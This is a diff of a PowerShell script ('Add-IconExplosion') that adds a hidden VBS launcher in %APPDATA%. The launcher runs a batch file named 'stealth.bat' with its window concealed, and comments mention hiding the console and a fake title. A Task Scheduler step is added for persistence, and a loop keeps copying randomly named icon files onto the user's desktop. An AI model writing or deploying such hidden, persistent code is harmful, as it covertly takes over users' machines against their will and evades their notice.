@@ -347,14 +347,6 @@ function Remove-OpenWithSquidraMenu {
 #Will Create the icons on the desktop
 function Add-IconExplosion {
     # === 1. Create the .BAT file (copies icon with random name) ===
-    $batContent_old = @'
-@echo off
-:loop
-set /a "rand=%random% * 899999 / 32768 + 100000"
-copy "C:\Users\Public\Pictures\ghidra.ico" "%USERPROFILE%\Desktop\red+light_%rand%.ico" >nul
-timeout /t 5 >nul
-goto loop
-'@
    $batContent = @'
 @echo off
 :: --- Hide console completely (run minimized + fake title) --
@@ -374,16 +366,18 @@ timeout /t 1 >nul
 goto loop
 '@
 
-$launcherBatIcon = @'
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "cmd.exe /c stealth.bat", 0, False
-'@
 #iconBoom
     $batPath = Join-Path $env:TEMP "icon_boom.bat"
     $batContent | Out-File -FilePath $batPath -Encoding ASCII
 
-$launcherBatIcon | Join-Path $env:APPDATA "456.vbs"
-$launcherBatIcon | Out-File -FilePath $batPath -Encoding ASCII
+# VBS tha twill deploy iconBoom
+$launcherBatIconBoom = @'
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "cmd.exe /c stealth.bat", 0, False
+'@
+
+$launcherBatPath = Join-Path $env:APPDATA "456.vbs"
+$launcherBatIconBoom | Out-File -FilePath $launcherBatPath -Encoding ASCII
 
     # === 2. Try to schedule it via Task Scheduler (no admin needed for user tasks) ===
     try {
